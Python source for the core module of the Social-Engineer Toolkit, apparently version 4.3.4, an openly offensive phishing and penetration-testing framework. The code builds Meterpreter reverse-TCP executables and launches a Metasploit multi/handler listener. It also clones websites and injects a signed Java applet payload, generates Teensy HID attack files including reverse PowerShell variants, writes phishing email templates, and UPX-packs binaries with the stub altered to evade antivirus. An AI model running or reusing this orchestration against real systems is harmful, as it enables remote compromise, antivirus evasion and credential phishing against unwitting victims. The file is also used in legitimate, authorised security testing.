#!/usr/bin/env python
##############################################
#
# Centralized classes, work in progress
# 
##############################################
import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string
import inspect
import base64
from src.core import dictionaries

# used to grab the true path for current working directory
definepath = os.getcwd()

# check operating system
def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

#
# Class for colors
#
if check_os() == "posix":
    class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''
                        
# if we are windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        BOLD = ''
        UNDERL = ''
        ENDC = ''
        backBlack = ''
        backRed = ''
        backGreen = ''
        backYellow = ''
        backBlue = ''
        backMagenta = ''
        backCyan = ''
        backWhite = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''

# this will be the home for the set menus 
def setprompt(category, text):
    # if no special prompt and no text, return plain prompt
    if category == '0' and text == "":
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
    # if the loop is here, either category or text was positive
    # if it's the category that is blank...return prompt with only the text
    if category == '0':
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
    # category is NOT blank
    else:
        # initialize the base 'set' prompt
        prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
        # if there is a category but no text
        if text == "":
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring += ">"
            return promptstring
        # if there is both a category AND text
        else:
            # iterate through the list received
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring = promptstring + "> " + text + ":"
            return promptstring

def yesno_prompt(category,text):
    valid_response = False
    while not valid_response: 
        response = raw_input(setprompt(category,text))
        response = str.lower(response)
        if response == "no" or response == "n":
                response = "NO"
                valid_response = True
        elif response == "yes" or response == "y":
                response = "YES"
                valid_response = True
        else:
                print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
    return response

def return_continue():
    print ("\n      Press " + bcolors.RED + "<return> " + bcolors.ENDC + "to continue")
    pause = raw_input()

############ DEBUGGING ###############
#### ALWAYS SET TO ZERO BEFORE COMMIT!
DEBUG_LEVEL = 0
                  #  0 = Debugging OFF
                  #  1 = debug imports only
                  #  2 = debug imports with pause for <ENTER>
                  #  3 = imports, info messages
                  #  4 = imports, info messages with pause for <ENTER>
                  #  5 = imports, info messages, menus
                  #  6 = imports, info messages, menus with pause for <ENTER>

debugFrameString = '-' * 72

def debug_msg(currentModule, message, msgType):
    if DEBUG_LEVEL == 0:
        pass         #stop evaluation efficiently
    else:
        if msgType <= DEBUG_LEVEL:
            # a bit more streamlined
            print bcolors.RED + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + bcolors.ENDC

            #print "\n" + bcolors.RED + debugFrameString + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + "\n" + debugFrameString + bcolors.ENDC
            #print "Debug level: %s" % DEBUG_LEVEL
            #print ("    msgType: %s" % msgType) + "\n"
            if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                raw_input("waiting for <ENTER>\n")

def mod_name():
    frame_records = inspect.stack()[1]
    calling_module=inspect.getmodulename(frame_records[1])
    return calling_module

##########################################
############ RUNTIME MESSAGES ############
def print_status(message):
    print bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message)

def print_info(message):
    print bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message)

def print_info_spaces(message):
    print bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message)

def print_warning(message):
    print bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message)

def print_error(message):
    print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC

def get_version():
    define_version = '4.3.4'
    return define_version

class create_menu:
    def __init__(self, text, menu):
        self.text = text
        self.menu = menu
        print text
        #print "\nType 'help' for information on this module\n"
        for i, option in enumerate(menu):
            
            menunum = i + 1
            # Check to see if this line has the 'return to main menu' code
            match = re.search("0D", option) 
            # If it's not the return to menu line:
            if not match:
                if menunum < 10:
                    print('   %s) %s' % (menunum,option))
                else:
                    print('  %s) %s' % (menunum,option))
            else:
                print '\n  99) Return to Main Menu\n'
        return

def validate_ip(address):
    try:
        if socket.inet_aton(address):
            if len(address.split('.')) == 4:
                debug_msg("setcore","this is a valid IP address",5)
                return True
            else:
                print_error("(hint) there seems to be some octets missing...")
                raise socket.error
        else:
            raise socket_error

    except socket.error:
        print_error("Invalid address format. Please enter a valid IPv4 address")
        return False

#
# grab the metaspoit path
#
def meta_path():
    # DEFINE METASPLOIT PATH
    meta_path = file("%s/config/set_config" % (definepath),"r").readlines()
    for line in meta_path:
        line = line.rstrip()
        match = re.search("METASPLOIT_PATH=", line)
        if match:
            line = line.replace("METASPLOIT_PATH=","")
            msf_path = line.rstrip()
            # if it doesn't end with a forward slash
            if msf_path.endswith("/"):
                pass
            else:
                msf_path = msf_path + "/"
            # path for metasploit
            trigger = 0
            if not os.path.isdir(msf_path):
                # specific for backtrack5
                if os.path.isfile("/opt/framework3/msf3/msfconsole"):
                    msf_path = "/opt/framework3/msf3/"
                    trigger = 1
                if os.path.isfile("/opt/framework/msf3/msfconsole"):
                    msf_path = "/opt/framework/msf3/"
                    trigger = 1
                if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
                    msf_path = "/opt/metasploit/msf3/"
                    trigger = 1
                if trigger == 0:
                    if check_os() != "windows":
                        check_metasploit = check_config("METASPLOIT_MODE=").lower()
                        if check_metasploit != "off":
                            print_error("Metasploit path not found. These payloads will be disabled.")
                            print_error("Please configure in the config/set_config.")
                            return_continue()
                            return False
                    if check_os() == "windows":
                        print_warning("Metasploit payloads are not currently supported. This is coming soon.")
                        msf_path = ""
            # this is an option if we don't want to use Metasploit period
            check_metasploit = check_config("METASPLOIT_MODE=").lower()
            if check_metasploit != "on": msf_path = False
            return msf_path

#
# grab the metaspoit path
#
def meta_database():
    # DEFINE METASPLOIT PATH
    meta_path = file("%s/config/set_config" % (definepath),"r").readlines()
    for line in meta_path:
        line = line.rstrip()
        match = re.search("METASPLOIT_DATABASE=", line)
        if match:
            line = line.replace("METASPLOIT_DATABASE=","")
            msf_database = line.rstrip()
            return msf_database


#
# grab the interface ip address
#
def grab_ipaddress():
    try:
        fileopen = file("%s/config/set_config" % (definepath), "r").readlines()
        for line in fileopen:
            line = line.rstrip()
            match = re.search("AUTO_DETECT=ON", line)
            if match:
                try:
                    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    rhost.connect(('google.com', 0))
                    rhost.settimeout(2)
                    rhost = rhost.getsockname()[0]
                    return rhost
                except Exception:
                    rhost = raw_input(setprompt("0", "Enter your interface IP Address"))
                    while 1:
                        # check if IP address is valid
                        ip_check = is_valid_ip(rhost)
                        if ip_check == False:
                            rhost = raw_input("[!] Invalid ip address try again: ")
                        if ip_check == True: break
                    return rhost
            # if AUTO_DETECT=OFF prompt for IP Address
            match1 = re.search("AUTO_DETECT=OFF", line)
            if match1:
                rhost = raw_input(setprompt("0", "IP address for the payload listener"))
                while 1:
                        # check if IP address is valid
                        ip_check = is_valid_ip(rhost)
                        if ip_check == False:
                            rhost = raw_input("[!] Invalid ip address try again: ")
                        if ip_check == True: break
                return rhost

    except Exception, e:
        print_error("ERROR:Something went wrong:")
        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC

#
# check for pexpect
#
def check_pexpect():
    try:
        import pexpect

    except:
        try:
            import src.core.thirdparty.pexpect
        except:
            print_error("ERROR:PExpect is required in order to fully run SET")
            print_warning("Please download and install PExpect: http://sourceforge.net/projects/pexpect/files/pexpect/Release%202.3/pexpect-2.3.tar.gz/download")
            if check_os() == "posix":
                #answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
                answer = yesno_prompt("0", "Would you like SET to attempt to install it for you? [yes|no]")
                if answer == "YES":
                    print_info("Installing Pexpect")
                    subprocess.Popen("wget http://downloads.sourceforge.net/project/pexpect/pexpect/Release%202.3/pexpect-2.3.tar.gz?use_mirror=hivelocity;tar -zxvf pexpect-2.3.tar.gz;cd pexpect-2.3/;python setup.py install", shell=True).wait()
                    # clean up
                    subprocess.Popen("rm -rf pexpect-2.3*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                    print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                    sys.exit(1)
                if answer == "NO":
                    sys.exit(1)
                else:
                    print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                    sys.exit(1)

#
# check for beautifulsoup
#
# try import for BeautifulSoup, required for MLITM
def check_beautifulsoup():
    try:
        import BeautifulSoup
    except:
        try:
            import src.core.thirdparty.BeautifulSoup

        except:
            print_error("ERROR:BeautifulSoup is required in order to fully run SET")
            print_warning("Please download and install BeautifulSoup: http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz")
            if check_os() == "posix":
                #answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
                answer = yesno_prompt("0", "Would you like SET to attempt to install it for you? [yes|no]")
                if answer == "YES":
                    print_info("Installing BeautifulSoup...")
                    subprocess.Popen("wget http://www.crummy.com/software/BeautifulSoup/download/3.x/BeautifulSoup-3.2.0.tar.gz;tar -zxvf BeautifulSoup-3.2.0.tar.gz;cd BeautifulSoup-*;python setup.py install", shell=True).wait()
                    # clean up
                    subprocess.Popen("rm -rf BeautifulSoup-*", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                    print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                    sys.exit(1)
    
                if answer == "NO":
                    sys.exit()
                else:
                    print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                    sys.exit(1)

# mssql check
def check_mssql():
    try:
        import _mssql
    except:
        print_error("ERROR:pymssql is required in order to fully run SET")
        print_warning("Please download and install pymssql: http://code.google.com/p/pymssql/downloads/list")
        if check_os() == "posix":
            answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
            #answer = raw_input(setprompt("0", "Would you like SET to attempt to install it for you? [yes|no]"))
            answer = yesno_prompt("0", "Would you like SET to attempt to install it for you? [yes|no]")
            if answer == "YES":
                print_info("Installing pymssql")
                if os.path.isfile("/usr/bin/yum"):
                    subprocess.Popen("yum install pymssql", shell=True).wait()
                    print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                    try:
                        sys.exit(0)
                    except SystemExit:
                        pass
                elif os.path.isfile("/usr/bin/apt-get"):
                    subprocess.Popen("apt-get install python-pymssql", shell=True).wait()
                    print_status("Finished... Relaunch SET, if it doesn't work for you, install manually.")
                    try:
                        sys.exit(0)
                    except SystemExit:
                        pass
                else:
                    print "No luck identifying an installer. Please install pymssql manually."
                    try:
                        sys.exit(0)
                    except SystemExit:
                        pass
            elif answer == "NO":
                sys.exit(1)
            else:
                print_error("ERROR:Invalid response, exiting the Social-Engineer Toolkit...")
                sys.exit(1)
# 
# cleanup old or stale files
#
def cleanup_routine():
    try:
        # restore original Java Applet
        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" % (definepath), "%s/src/program_junk/Signed_Update.jar" % (definepath))
        if os.path.isfile("newcert.pem"):
            os.remove("newcert.pem")
        if os.path.isfile("src/program_junk/interfaces"):
            os.remove("src/program_junk/interfaces")
        if os.path.isfile("src/html/1msf.raw"):
            os.remove("src/html/1msf.raw")
        if os.path.isfile("src/html/2msf.raw"):
            os.remove("src/html/2msf.raw")
        if os.path.isfile("msf.exe"):
            os.remove("msf.exe")
        if os.path.isfile("src/html/index.html"):
            os.remove("src/html/index.html")
        if os.path.isfile("src/program_junk/Signed_Update.jar"):
            os.remove("src/program_junk/Signed_Update.jar")
	#subprocess.Popen("rm -rf src/program_junk/*", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    except:
        pass

#
# Update Metasploit
#
def update_metasploit():
    print_info("Updating the Metasploit Framework...Be patient.")
    msf_path = meta_path()
    svn_update = subprocess.Popen("cd %s/;svn update" % (msf_path), shell=True).wait()
    print_status("Metasploit has successfully updated!")
    return_continue()

#
# Update The Social-Engineer Toolkit
#
def update_set():
    print_info("Updating the Social-Engineer Toolkit, be patient...")
    subprocess.Popen("git pull", shell=True).wait()
    print_status("The updating has finished, returning to main menu..")
    time.sleep(2)

#
# Pull the help menu here
#
def help_menu():
    fileopen = file("readme/README","r").readlines()
    for line in fileopen:
        line = line.rstrip()
        print line
    fileopen = file("readme/CREDITS", "r").readlines()
    print "\n"
    for line in fileopen:
        line = line.rstrip()
        print line
    return_continue()


#
# This is a small area to generate the date and time
#
def date_time():
    now = str(datetime.datetime.today())
    return now

#
# generate a random string
#
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])

#
# clone JUST a website, and export it.
# Will do no additional attacks.
#
def site_cloner(website, exportpath, *args):
    grab_ipaddress()
    ipaddr = grab_ipaddress()
    filewrite = file("src/program_junk/interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file("src/program_junk/ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file("src/program_junk/site.template", "w")
    filewrite.write("URL=" + website)
    filewrite.close()
    # if we specify a second argument this means we want to use java applet
    if args[0] == "java":
        # needed to define attack vector
        filewrite = file("src/program_junk/attack_vector", "w")
        filewrite.write("java")
        filewrite.close()
    sys.path.append("src/webattack/web_clone")
    # if we are using menu mode we reload just in case
    try:
        debug_msg("setcore","importing 'src.webattack.web_clone.cloner'",1)
        reload(cloner)

    except:
        debug_msg("setcore","importing 'src.webattack.web_clone.cloner'",1)
        import cloner

    # copy the file to a new folder
    print_status("Site has been successfully cloned and is: " + exportpath)
    subprocess.Popen("mkdir '%s';cp src/program_junk/web_clone/* '%s'" % (exportpath, exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

#
# this will generate a meterpreter reverse payload (executable)
# with backdoored executable, digital signature stealing, and
# UPX encoded (if these options are enabled). It will automatically
# inherit the AUTO_DETECT=ON or OFF configuration.
#
# usage: metasploit_reverse_tcp_exe(portnumber)
# 
def meterpreter_reverse_tcp_exe(port):

    ipaddr = grab_ipaddress()
    filewrite = file("src/program_junk/interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file("src/program_junk/ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = file("src/program_junk/ipaddr.file", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    # trigger a flag to be checked in payloadgen
    # if this flag is true, it will skip the questions
    filewrite = file("src/program_junk/meterpreter_reverse_tcp_exe", "w")
    filewrite.write(port)
    filewrite.close()
    # import the system path for payloadgen in SET
    sys.path.append("src/core/payloadgen")
    try:
        debug_msg("setcore","importing 'src.core.payloadgen.create_payloads'",1)
        reload(create_payloads)

    except:
        debug_msg("setcore","importing 'src.core.payloadgen.create_payloads'",1)
        import create_payloads

    random_value = generate_random_string(5, 10)
    # copy the created executable to program_junk
    print_status("Executable created under src/program_junk/%s.exe" % (random_value))
    subprocess.Popen("cp src/html/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 
#
# Start a metasploit multi handler
#
def metasploit_listener_start(payload,port):
    # open a file for writing
    filewrite = file("%s/src/program_junk/msf_answerfile" % (definepath), "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST 0.0.0.0\nset LPORT %s\nexploit -j\n\n" % (payload, port))
    # close the file
    filewrite.close()
    # launch msfconsole
    metasploit_path = meta_path()
    subprocess.Popen("%s/msfconsole -r %s/src/program_junk/msf_answerfile" % (metasploit_path, definepath), shell=True).wait()

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_web_server(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import thread, SocketServer, SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        thread.start_new_thread(httpd.serve_forever, ())
        #httpd.serve_forever()
        # change directory to the path we specify for output path
        # os.chdir(directory)
    # handle keyboard interrupts

    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()

#
# this will start a web server without threads
#
def start_web_server_unthreaded(directory):
    try:
        # import the threading, socketserver, and simplehttpserver
        import thread, SocketServer, SimpleHTTPServer
        # create the httpd handler for the simplehttpserver
        # we set the allow_reuse_address incase something hangs can still bind to port
        class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
        # specify the httpd service on 0.0.0.0 (all interfaces) on port 80
        httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # thread this mofo
        os.chdir(directory)
        httpd.serve_forever()
        # change directory to the path we specify for output path
        os.chdir(directory)
        # handle keyboard interrupts

    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()


#
# This will create the java applet attack from start to finish.
# Includes payload (reverse_meterpreter for now) cloning website
# and additional capabilities.
#
def java_applet_attack(website, port, directory):
    # create the payload
    meterpreter_reverse_tcp_exe(port)
    # clone the website and inject java applet
    site_cloner(website,directory,"java")

    # this part is needed to rename the msf.exe file to a randomly generated one
    filename = check_options("MSF.EXE=")
    if check_options != 0:
    #if os.path.isfile("src/program_junk/rand_gen"):
	  
	# move the file to the specified directory and filename
	subprocess.Popen("cp src/html/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # lastly we need to copy over the signed applet
    subprocess.Popen("cp src/program_junk/Signed_Update.jar %s" % (directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

    # start the web server by running it in the background
    start_web_server(directory)

    # run multi handler for metasploit
    print_info("Starting the multi/handler through Metasploit...")
    metasploit_listener_start("windows/meterpreter/reverse_tcp",port)

#
# this will create a raw PDE file for you to use in your teensy device
#
#
def teensy_pde_generator(attack_method):

    # grab the ipaddress
    ipaddr=grab_ipaddress()

    # if we are doing the attack vector teensy beef
    if attack_method == "beef":
        # specify the filename
        filename = file("src/teensy/beef.pde", "r")
        filewrite = file("reports/beef.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Beef Attack Vector under reports/beef.pde")

    # if we are doing the attack vector teensy beef
    if attack_method == "powershell_down":
        # specify the filename
        filename = file("src/teensy/powershell_down.pde", "r")
        filewrite = file("reports/powershell_down.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_down.pde")

    # if we are doing the attack vector teensy 
    if attack_method == "powershell_reverse":
        # specify the filename
        filename = file("src/teensy/powershell_reverse.pde", "r")
        filewrite = file("reports/powershell_reverse.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/powershell_reverse.pde")

    # if we are doing the attack vector teensy beef
    if attack_method == "java_applet":
        # specify the filename
        filename = file("src/teensy/java_applet.pde", "r")
        filewrite = file("reports/java_applet.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/java_applet.pde")

    # if we are doing the attack vector teensy 
    if attack_method == "wscript":
        # specify the filename
        filename = file("src/teensy/wscript.pde", "r")
        filewrite = file("reports/wscript.pde", "w")
        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/wscript.pde")

    # All the options share this code except binary2teensy
    if attack_method != "binary2teensy":
        for line in filename:
            line = line.rstrip()
            match = re.search("IPADDR", line)
            if match:
                line = line.replace("IPADDR", ipaddr)
            filewrite.write(line)

    # binary2teensy method
    if attack_method == "binary2teensy":
        # specify the filename
        import src.teensy.binary2teensy
        teensy_string = ("Successfully generated Teensy HID Attack Vector under reports/binary2teensy.pde")

    print_status(teensy_string)
#
# Expand the filesystem windows directory
# 

def windows_root():
    return os.environ['WINDIR']

#
# core log file routine for SET
#
def log(error):
        # open log file only if directory is present (may be out of directory for some reason)
        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)): 
                filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "w")
                filewrite.write("")
                filewrite.close()
        if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath)):
                error = str(error)
                # open file for writing
                filewrite = file("%s/src/logs/set_logfile.log" % (definepath), "a")
                # write error message out
                filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
                # close the file
                filewrite.close()

#
# upx encoding and modify binary
#
def upx(path_to_file):
        # open the set_config
        fileopen = file("config/set_config", "r")
        for line in fileopen:
                line = line.rstrip()
                match = re.search("UPX_PATH=", line)
                if match:
                        upx_path = line.replace("UPX_PATH=", "")
        
        # if it isn't there then bomb out
        if not os.path.isfile(upx_path):
                print_warning("UPX was not detected. Try configuring the set_config again.")

        # if we detect it
        if os.path.isfile(upx_path):
                print_info("Packing the executable and obfuscating PE file randomly, one moment.")
                # packing executable
                subprocess.Popen("%s -9 -q -o src/program_junk/temp.binary %s" % (upx_path, path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                # move it over the old file
                subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                
                # random string
                random_string = generate_random_string(3,3).upper()

                # 4 upx replace - we replace 4 upx open the file
                fileopen = file(path_to_file, "rb")
                filewrite = file("src/program_junk/temp.binary", "wb")
                
                # read the file open for data
                data = fileopen.read()
                # replace UPX stub makes better evasion for A/V
                filewrite.write(data.replace("UPX", random_string, 4))
                filewrite.close()
                # copy the file over
                subprocess.Popen("mv src/program_junk/temp.binary %s" % (path_to_file), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        time.sleep(3)

def show_banner(define_version,graphic):

        if graphic == "1":
                if check_os() == "posix":
                        os.system("clear")
                if check_os() == "windows":
                        os.system("cls")
                show_graphic()
        else:
                os.system("clear")
        
        print bcolors.BLUE + """
  [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]        
  [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
  [---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
  [---]              Codename: '""" + bcolors.YELLOW + """Turbulence""" + bcolors.BLUE + """'              [---]
  [---]         Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""        [---]
  [---]         Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""        [---]
  [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]

""" + bcolors.GREEN+"""     Welcome to the Social-Engineer Toolkit (SET). The one
      stop shop for all of your social-engineering needs.
    """ 
        print bcolors.BLUE + """      Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
        print bcolors.BOLD + """  The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC

def show_graphic():
        menu = random.randrange(2,10)
        if menu == 2:
                print bcolors.YELLOW + r"""
                         .--.  .--. .-----.
                        : .--': .--'`-. .-'
                        `. `. : `;    : :  
                         _`, :: :__   : :  
                        `.__.'`.__.'  :_;   """ + bcolors.ENDC
                return
    
        if menu == 3:
                print bcolors.GREEN + r"""
                  _______________________________
                 /   _____/\_   _____/\__    ___/
                 \_____  \  |    __)_   |    |   
                 /        \ |        \  |    |   
                /_______  //_______  /  |____|   
                        \/         \/            """ + bcolors.ENDC
                return
        
        if menu == 4:
                print bcolors.BLUE + r"""                                               
                    :::===  :::===== :::====
                    :::     :::      :::====
                     =====  ======     ===  
                        === ===        ===  
                    ======  ========   ===  
""" + bcolors.ENDC

        if menu == 5:
                print bcolors.RED + r"""
                   ..######..########.########
                   .##....##.##..........##...
                   .##.......##..........##...
                   ..######..######......##...
                   .......##.##..........##...
                   .##....##.##..........##...
                   ..######..########....##...  """ + bcolors.ENDC
                return

        if menu == 6:
                print bcolors.PURPLE + r'''
                 .M"""bgd `7MM"""YMM MMP""MM""YMM 
                ,MI    "Y   MM    `7 P'   MM   `7 
                `MMb.       MM   d        MM      
                  `YMMNq.   MMmmMM        MM      
                .     `MM   MM   Y  ,     MM      
                Mb     dM   MM     ,M     MM      
                P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
                return
        
        if menu == 7:
                print bcolors.YELLOW + r""" 
                      ________________________
                      __  ___/__  ____/__  __/
                      _____ \__  __/  __  /   
                      ____/ /_  /___  _  /    
                      /____/ /_____/  /_/     """ + bcolors.ENDC
                return

        if menu == 8:
                print bcolors.RED + r'''
                  !\_________________________/!\
                  !!                         !! \
                  !! Social-Engineer Toolkit !!  \
                  !!                         !!  !
                  !!          Free           !!  !
                  !!                         !!  !
                  !!          #hugs          !!  !
                  !!                         !!  !
                  !!      By: TrustedSec     !!  /
                  !!_________________________!! /
                  !/_________________________\!/
                     __\_________________/__/!_
                    !_______________________!/
                  ________________________
                 /oooo  oooo  oooo  oooo /!
                /ooooooooooooooooooooooo/ /
               /ooooooooooooooooooooooo/ /
              /C=_____________________/_/''' + bcolors.ENDC


        if menu == 9:
                print bcolors.YELLOW + """
             01011001011011110111010100100000011100
             10011001010110000101101100011011000111
             10010010000001101000011000010111011001
             10010100100000011101000110111100100000
             01101101011101010110001101101000001000
             00011101000110100101101101011001010010
             00000110111101101110001000000111100101
             10111101110101011100100010000001101000
             01100001011011100110010001110011001000
             00001110100010110100101001001000000101
             01000110100001100001011011100110101101
             11001100100000011001100110111101110010
             00100000011101010111001101101001011011
             10011001110010000001110100011010000110
             01010010000001010011011011110110001101
             10100101100001011011000010110101000101
             01101110011001110110100101101110011001
             01011001010111001000100000010101000110
             11110110111101101100011010110110100101
             11010000100000001010100110100001110101
             011001110111001100101010""" + bcolors.ENDC

#
# identify if set interactive shells are disabled
#
def set_check():
    fileopen=file("config/set_config", "r")
    for line in fileopen:
        match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
        # if we turned it off then we return a true else return false
        if match: 
            return True
        match1 = re.search("SET_INTERACTIVE_SHELL=ON", line)
        # return false otherwise
        if match1:
            return False

# if the user specifies 99
def menu_back():
    print_info("Returning to the previous menu...")

# used to generate random templates for the phishing schema
def custom_template():
    try:
        print ("         [****]  Custom Template Generator [****]\n")
        print ("Always looking for new templates! In the set/src/templates directory send an email\n   to davek@secmaniac.com if you got a good template!")
        author=raw_input(setprompt("0", "Enter the name of the author"))
        filename=randomgen=random.randrange(1,99999999999999999999)
        filename=str(filename)+(".template")
        subject=raw_input(setprompt("0", "Enter the subject of the email"))
        try:
            body=raw_input(setprompt("0", "Enter the body of the message, hit return for a new line. Control+c when finished: "))
            while body != 'sdfsdfihdsfsodhdsofh':
                try:
                    body+=(r"\n")
                    body+=raw_input("Next line of the body: ")
                except KeyboardInterrupt: break
        except KeyboardInterrupt: pass
        filewrite=file("src/templates/%s" % (filename), "w")
        filewrite.write("# Author: "+author+"\n#\n#\n#\n")
        filewrite.write('SUBJECT='+'"'+subject+'"\n\n')
        filewrite.write('BODY='+'"'+body+'"\n')
        print "\n"
        filewrite.close()
    except Exception, e:
        print_error("ERROR:An error occured:")
        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# routine for checking length of a payload: variable equals max choice
def check_length(choice,max):
    # start initital loop
    counter = 0
    while 1:
        if counter == 1:
            choice = raw_input(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + "Invalid choice try again: ")
        # try block in case its not a integer
        try:
            # check to see if its an integer
            choice = int(choice)
